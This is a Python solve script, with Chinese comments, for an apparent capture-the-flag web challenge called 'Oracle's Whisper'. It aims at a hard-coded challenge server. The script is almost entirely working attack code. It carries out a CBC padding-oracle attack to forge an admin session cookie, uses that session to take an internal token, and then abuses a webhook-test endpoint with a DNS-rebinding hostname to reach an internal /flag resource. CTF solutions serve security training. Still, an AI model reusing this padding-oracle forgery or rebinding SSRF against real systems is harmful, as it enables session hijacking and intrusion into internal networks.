"""Oracle's Whisper solve script.

利用链：
1. /api/session/decrypt 存在 CBC Padding Oracle。
2. 通过倒推中间值伪造 admin session。
3. 使用 admin session 访问 /api/profile 获取 internal_token。
4. 借助 /api/webhook/test + DNS rebinding 访问内网 /flag。
"""
import argparse
import base64
import json
import os
import re
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path


BLOCK = 16
DEFAULT_BASE = "http://39.105.213.28:12605"
DEFAULT_WEBHOOK_URL = "http://7f000001.01010101.rbndr.us:6000/cache/template?name=/flag"
FLAG_RE = re.compile(r"ISCC\{[^}\r\n]{1,256}\}")


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def xor_bytes(left: bytes, right: bytes) -> bytes:
    return bytes(a ^ b for a, b in zip(left, right))


class Client:
    def __init__(self, base: str, timeout: int = 10, retries: int = 3, retry_sleep: float = 0.8) -> None:
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.retries = retries
        self.retry_sleep = retry_sleep

    def request(self, method: str, path: str, *, body: bytes | None = None, headers: dict | None = None) -> tuple[int, dict, bytes]:
        req = urllib.request.Request(
            self.base + path,
            data=body,
            method=method,
            headers=headers or {},
        )
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.getcode(), dict(resp.info().items()), resp.read()
        except urllib.error.HTTPError as exc:
            return exc.code, dict(exc.headers.items()), exc.read()

    def post_json(self, path: str, payload: dict, extra_headers: dict | None = None) -> tuple[int, dict, bytes]:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "oracle-whisper-solve/1.0",
            "Connection": "close",
        }
        if extra_headers:
            headers.update(extra_headers)
        return self.request("POST", path, body=json.dumps(payload, ensure_ascii=False).encode(), headers=headers)

    def get(self, path: str, cookie: str | None = None) -> tuple[int, dict, bytes]:
        headers = {
            "User-Agent": "oracle-whisper-solve/1.0",
            "Connection": "close",
        }
        if cookie:
            headers["Cookie"] = cookie
        return self.request("GET", path, headers=headers)

    def oracle(self, blob: bytes) -> bool:
        # 该接口的关键差异是：
        # 400 -> padding 错误
        # 422/200/... -> padding 正确，只是明文未必能被成功解码
        token = b64url_encode(blob)
        payload = {"token": token}
        for attempt in range(self.retries):
            code, _, _ = self.post_json("/api/session/decrypt", payload)
            if code == 429:
                time.sleep(self.retry_sleep * (attempt + 1))
                continue
            return code != 400
        raise RuntimeError("oracle hit rate limiting too many times")

    def recover_intermediate(self, target_block: bytes) -> bytes:
        if len(target_block) != BLOCK:
            raise ValueError("target block must be 16 bytes")

        # dec[i] = D_k(target_block)[i]
        dec = bytearray(BLOCK)
        forged = bytearray(BLOCK)
        for pad in range(1, BLOCK + 1):
            idx = BLOCK - pad
            for guess in range(256):
                for j in range(idx + 1, BLOCK):
                    forged[j] = dec[j] ^ pad
                forged[idx] = guess
                if not self.oracle(bytes(forged) + target_block):
                    continue
                dec[idx] = guess ^ pad
                break
            else:
                raise RuntimeError(f"failed to recover byte at pad={pad}")
            print(f"[oracle] recovered {pad:02d}/16 bytes for current block", flush=True)
        return bytes(dec)

    def forge_session(self, plaintext: bytes) -> str:
        if len(plaintext) % BLOCK != 0:
            raise ValueError("plaintext must be padded to a multiple of 16 bytes")

        blocks = [plaintext[i : i + BLOCK] for i in range(0, len(plaintext), BLOCK)]
        cipher_blocks = [b""] * (len(blocks) + 1)
        cipher_blocks[-1] = os.urandom(BLOCK)

        # 从最后一个密文块开始逆推：
        # 如果知道 I_i = D_k(C_i)，则只需设置 C_{i-1} = I_i xor P_i
        for idx in range(len(blocks) - 1, -1, -1):
            dec = self.recover_intermediate(cipher_blocks[idx + 1])
            cipher_blocks[idx] = xor_bytes(dec, blocks[idx])

        token = b"".join(cipher_blocks)
        return b64url_encode(token)

    def fetch_profile(self, token: str) -> dict:
        code, _, raw = self.get("/api/profile", cookie=f"session={token}")
        if code != 200:
            raise RuntimeError(f"/api/profile returned {code}: {raw.decode('utf-8', 'replace')}")
        return json.loads(raw.decode("utf-8", "replace"))

    def trigger_webhook(self, token: str, internal_token: str, url: str) -> tuple[int, dict, bytes]:
        payload = {
            "url": url,
            "method": "GET",
            "headers": {"X-Internal-Token": internal_token},
        }
        return self.post_json("/api/webhook/test", payload, extra_headers={"Cookie": f"session={token}"})


def pkcs7_pad(data: bytes, block_size: int = BLOCK) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    if pad_len == 0:
        pad_len = block_size
    return data + bytes([pad_len]) * pad_len


def parse_webhook_response(raw: bytes) -> str:
    text = raw.decode("utf-8", "replace")
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        return text
    body = data.get("body", "")
    if isinstance(body, dict):
        return json.dumps(body, ensure_ascii=False)
    if isinstance(body, str):
        try:
            nested = json.loads(body)
        except json.JSONDecodeError:
            return body
        if isinstance(nested, dict):
            return json.dumps(nested, ensure_ascii=False)
        return body
    return text


def extract_flag(text: str) -> str | None:
    match = FLAG_RE.search(text)
    if match:
        return match.group(0)
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="Reproduce Oracle's Whisper with a CBC padding oracle")
    parser.add_argument("--base", default=DEFAULT_BASE, help="challenge base URL")
    parser.add_argument("--webhook-url", default=DEFAULT_WEBHOOK_URL, help="internal webhook URL used for flag extraction")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout in seconds")
    parser.add_argument("--retries", type=int, default=3, help="oracle retry count on 429")
    parser.add_argument("--retry-sleep", type=float, default=0.8, help="sleep between oracle retries")
    parser.add_argument("--artifacts-dir", default=str(Path(__file__).resolve().parent / "artifacts"), help="output directory")
    parser.add_argument("--attempts", type=int, default=24, help="webhook retries")
    args = parser.parse_args()

    artifacts_dir = Path(args.artifacts_dir)
    artifacts_dir.mkdir(parents=True, exist_ok=True)

    client = Client(args.base, timeout=args.timeout, retries=args.retries, retry_sleep=args.retry_sleep)

    # 题目实际接受的会话 JSON 为：
    # {"user":"oracle","role":"admin"}
    plaintext = pkcs7_pad(b'{"user":"oracle","role":"admin"}')
    print("[+] forging admin session", flush=True)
    token = client.forge_session(plaintext)
    (artifacts_dir / "admin_token.txt").write_text(token + "\n", encoding="utf-8")

    profile = client.fetch_profile(token)
    (artifacts_dir / "profile.json").write_text(json.dumps(profile, ensure_ascii=False, indent=2), encoding="utf-8")

    internal_token = profile.get("internal_token")
    if not internal_token:
        raise RuntimeError("internal_token missing from /api/profile")

    print(f"[+] admin token: {token}")
    print(f"[+] internal token: {internal_token}")

    for attempt in range(1, args.attempts + 1):
        code, headers, raw = client.trigger_webhook(token, internal_token, args.webhook_url)
        text = parse_webhook_response(raw)
        (artifacts_dir / f"webhook_attempt_{attempt}.txt").write_text(text, encoding="utf-8")
        flag = extract_flag(text)
        if code == 200 and flag:
            (artifacts_dir / "flag.txt").write_text(flag + "\n", encoding="utf-8")
            print(flag)
            return 0
        print(f"[-] attempt {attempt}: status={code}")
        time.sleep(1)

    print("[-] flag not found; try running again", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
